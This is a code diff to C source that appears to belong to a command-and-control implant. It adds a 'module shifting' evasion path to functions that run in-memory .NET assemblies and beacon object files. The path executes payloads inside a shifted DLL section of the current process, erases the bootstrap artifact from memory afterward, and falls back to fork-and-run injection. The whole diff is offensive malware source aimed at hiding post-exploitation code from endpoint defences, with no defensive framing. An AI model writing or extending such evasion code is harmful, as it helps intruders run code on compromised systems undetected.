@@ -232,6 +232,22 @@ BOOL fork_run_assembly(PINSTANCE inst,
     (void)args_str; (void)args_len; (void)output; (void)output_len;
     return FALSE;
 #else
+    // ── Shift-and-restore path (module shifting) ──
+    // Run the CLR bootstrap inside a shifted DLL section in this process;
+    // the bootstrap artifact is erased from memory when the run completes.
+    // Falls back to the remote fork path below if the shift fails.
+#if defined(INCLUDE_EVASION_MODULE_SHIFT) && defined(MODULE_SHIFT_BOOTSTRAP)
+    {
+        BYTE* shift_out = NULL;
+        DWORD shift_len = 0;
+        if (module_shift_run_assembly(inst, asm_data, asm_len, args_str, args_len,
+                                      &shift_out, &shift_len)) {
+            *output = shift_out;
+            *output_len = shift_len;
+            return TRUE;
+        }
+    }
+#endif
     FORK_CTX ctx;
     if (!fork_spawn(inst, &ctx))
         return FALSE;
@@ -322,6 +338,22 @@ BOOL fork_run_bof(PINSTANCE inst,
     (void)bof_args; (void)bof_args_len; (void)output; (void)output_len;
     return FALSE;
 #else
+    // ── Shift-and-restore path (module shifting) ──
+    // Run the BOF bootstrap inside a shifted DLL section in this process;
+    // erased from memory when the run completes. Falls back to the remote
+    // fork path below if the shift fails.
+#if defined(INCLUDE_EVASION_MODULE_SHIFT) && defined(MODULE_SHIFT_BOOTSTRAP)
+    {
+        BYTE* shift_out = NULL;
+        DWORD shift_len = 0;
+        if (module_shift_run_bof(inst, bof_data, bof_len, bof_args, bof_args_len,
+                                 &shift_out, &shift_len)) {
+            *output = shift_out;
+            *output_len = shift_len;
+            return TRUE;
+        }
+    }
+#endif
     FORK_CTX ctx;
     if (!fork_spawn(inst, &ctx))
         return FALSE;
